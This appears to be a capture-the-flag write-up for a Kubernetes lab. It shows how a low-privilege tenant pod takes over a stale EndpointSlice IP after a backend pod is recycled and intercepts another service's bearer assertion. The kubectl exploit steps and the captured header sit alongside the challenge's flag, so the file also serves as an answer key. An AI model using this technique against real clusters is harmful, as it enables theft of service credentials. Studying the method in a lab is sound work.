# Net Share
## Challenge Setup



This challenge is deployed through Kubernetes on Demand. The setup below
follows the first section of `kubernetes-on-demand-main/Readme.md`, adapted to
the paths in this repository.

### Setup environment

```bash
mv .env.example .env
```

Set the `PUBLIC_HOST` as the Kubernetes IP address (for example, localhost), then build and start the KOND controller:

```bash
cd kubernetes-on-demand-main
docker build -t kube-controller controller
docker network create kind
docker compose up --build
```


## Scenario

The workload cluster models a common platform split across three namespaces:

| Namespace | Purpose |
|---|---|
| `tenant-runtime` | Writable workspace for creating target Pods and reading their logs. |
| `customer-platform` | Victim application namespace. The internal API `profile-query`, backend `customer-profile-api`, and EndpointSlice live here with read-only reconnaissance access. |
| `platform-operations` | Platform task namespace. It runs `profile-cache-refresh` and `endpoint-catalog-reconciler`; its Pods and Secrets are not readable. |

`profile-cache-refresh` sends an internal request roughly every 10 seconds. The
flag is not sent as a plain header. It is embedded in the `service_proof` field
inside a service assertion:

```text
Authorization: Bearer svc.v1.<base64url-json-payload>.<hmac-sha256-signature>
```

The available identity is the low-privilege `runtime-operator` ServiceAccount.
It cannot read Secrets, mutate platform resources, delete victim backend Pods,
request a specific Pod IP, or exec into other Pods.


## Vulnerability

kube-proxy does not perform backend health checks. It DNATs Service traffic to
the addresses declared in EndpointSlice data:

```text
profile-cache-refresh -> profile-query (ClusterIP) -> kube-proxy DNAT -> 10.244.x.A:8080
                                                                     ^
                                           old Pod removed; IP is being or has been released by CNI
```

If a target Pod receives `10.244.x.A` while the EndpointSlice still advertises
that address, kube-proxy forwards the next `profile-cache-refresh` request to
the target Pod. The target Pod inherits the trusted backend's network identity
and can capture the service assertion.


## Exploitation Constraints

1. The backend recycle cannot be triggered directly because Pods in
   `customer-platform` cannot be deleted with the available identity. The
   exploit has to wait for `endpoint-catalog-reconciler`.
2. The stale window is 28 seconds, so IP acquisition has to happen quickly.
3. Calico IPAM release is not instantaneous. The target IP may only reappear
   after several create/delete waves.
4. The cluster Pod CIDR is `10.244.0.0/22`, while Calico uses `blockSize: 28`.
   The practical collision domain is the worker node's `/28` block, and
   `tenant-runtime` allows at most 10 Pods.
5. Waiting for requests after a miss wastes the window. Only wait for
   `profile-cache-refresh` after the target Pod actually gets the target IP.

## Exploit

### Step 1 — Watch for the stale window

Open two watch terminals to monitor the backend Pod and EndpointSlice:

```bash
kubectl get pods -n customer-platform -o wide -w
```

Then get:

```text
NAME                                    READY   STATUS    RESTARTS   AGE   IP            NODE
customer-profile-api-7b6b9897c8-g4lq8   1/1     Running   0          39s   10.244.1.34   worker-0
customer-profile-api-7b6b9897c8-g4lq8   1/1     Terminating   0      40s   10.244.1.34   worker-0
customer-profile-api-7b6b9897c8-k2p9m   1/1     Running   0          2s    10.244.1.37   worker-0
...
```

```bash
kubectl get endpointslices -n customer-platform -w
```

With the output:

```text
NAME                     ADDRESSTYPE   PORTS   ENDPOINTS     AGE
profile-query-registry   IPv4          8080    10.244.1.34   5m42s
profile-query-registry   IPv4          8080    10.244.1.34   6m10s
profile-query-registry   IPv4          8080    10.244.1.37   6m38s
...
```

### Step 2 — Acquire the stale backend IP with a target Pod

Read the backend IP advertised by the EndpointSlice and compare it with the
currently Running backend Pod IP:

```bash
ADV=$(kubectl get endpointslices -n customer-platform \
  -l kubernetes.io/service-name=profile-query \
  -o jsonpath='{.items[0].endpoints[0].addresses[0]}')

POD=$(kubectl get pods -n customer-platform \
  -l app.kubernetes.io/name=customer-profile-api \
  --field-selector status.phase=Running \
  -o jsonpath='{.items[0].status.podIP}')

echo "advertised=$ADV running=${POD:-<none>}"
```

When the two IPs differ, or when the Running Pod IP is empty, the stale window
is open. The advertised IP is the target IP to acquire.

Create a target Pod that listens on TCP 8080 and prints the raw incoming HTTP
headers (shown in `exp.yaml`):

```bash
kubectl apply -f exp.yaml
```

Check whether the target Pod received the advertised IP:

```bash
kubectl get pod connectivity-probe-1 -n tenant-runtime -o jsonpath='{.status.podIP}'; echo
```

If the assigned IP does not match `$ADV`, delete the Pod and repeat this step
while the stale window is still open:

```bash
kubectl delete pod connectivity-probe-1 -n tenant-runtime --grace-period=0 --force
```

The Pod must comply with `tenant-runtime` admission rules: use the
`runtime-operator` ServiceAccount, disable automatic token mounting, use the
preloaded pinned image, run from `/`, and drop privilege features.

### Step 3 — Capture the raw header

Once the target Pod holds the target IP, follow its logs and wait for the next
`profile-cache-refresh` request:

```bash
kubectl logs -f connectivity-probe-1 -n tenant-runtime
```

The listener receives a JWT-like service assertion in the `Authorization`
header. The format is `svc.v1.<base64url-json-payload>.<signature>`, so the
third dot-separated field is the Base64URL-encoded JSON payload to analyze.

Captured raw header output:

```text
[*] target pod listening on :8080
=== raw request headers ===
GET /v1/cache/refresh/profile-snapshot
Host: profile-query.customer-platform.svc.cluster.local
User-Agent: curl/8.5.0
Accept: */*
Authorization: Bearer svc.v1.eyJhdWQiOiJjdXN0b21lci1wcm9maWxlLWFwaSIsImV4cCI6MTcxMDA4NjQwMCwiaWF0IjoxNzEwMDAwMDAwLCJpc3MiOiJwcm9maWxlLWNhY2hlLXJlZnJlc2giLCJzY29wZSI6InByb2ZpbGUucmVhZCIsInNlcnZpY2VfcHJvb2YiOiJzay00NWRhNjUyOS1lYzRlLWI4ODAtN2Y1Zi0yZDRmYTMxYjNjOTYiLCJ0ZW5hbnQiOiJ0ZW5hbnQtcnVudGltZSJ9.example-signature
X-Request-ID: 4ef42264-7d9d-44f5-8af0-8ef2b96f7747
X-Tenant-ID: tenant-runtime
X-Service-Route: profile-cache-refresh
=== end headers ===
```

Decoded output:

```json
{
  "aud": "customer-profile-api",
  "exp": 1710086400,
  "iat": 1710000000,
  "iss": "profile-cache-refresh",
  "scope": "profile.read",
  "service_proof": "sk-45da6529-ec4e-b880-7f5f-2d4fa31b3c96",
  "tenant": "tenant-runtime"
}
```

```text
flag = sk-45da6529-ec4e-b880-7f5f-2d4fa31b3c96
```
